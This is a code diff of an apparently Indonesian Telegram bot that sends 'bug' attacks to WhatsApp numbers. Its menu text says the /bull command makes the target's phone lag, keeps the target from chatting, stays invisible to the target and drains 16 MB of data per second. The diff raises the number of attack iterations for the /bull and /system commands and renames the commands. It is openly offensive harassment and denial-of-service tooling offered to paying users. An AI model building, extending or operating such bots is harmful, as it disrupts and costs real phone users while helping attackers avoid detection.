@@ -1953,9 +1953,9 @@ Hellow I am Bot Ranz Tele ᯤ Ready to carry out the task  友
             
  𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕
 ──────────────────────────
-#- RanzDelayMention
-▢ /delaymention 628xxx
-╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir
+#- RanzBulldozer
+▢ /bull 628xxx
+╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir dan keuntungan bug ini nyedot kuota (16mb/detik)
 
 #- RanzBugForceClose
 ▢ /forceclose 628xxx
@@ -2344,7 +2344,7 @@ bot.onText(/\/bull(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /bulldog 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /bull 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -2362,7 +2362,7 @@ bot.onText(/\/bull(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 75; i++) { // Kirim 3 kali langsung
         await bulldog(formatedNumber);
         await bulldog(formatedNumber);
         await bulldog(formatedNumber);
@@ -2375,7 +2375,7 @@ bot.onText(/\/bull(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /superdelay
+┃〢 Cᴏᴍᴍᴀɴᴅ : /bull
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
@@ -2411,7 +2411,7 @@ bot.onText(/\/system(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
         await VampOri(formatedNumber);
     }
 
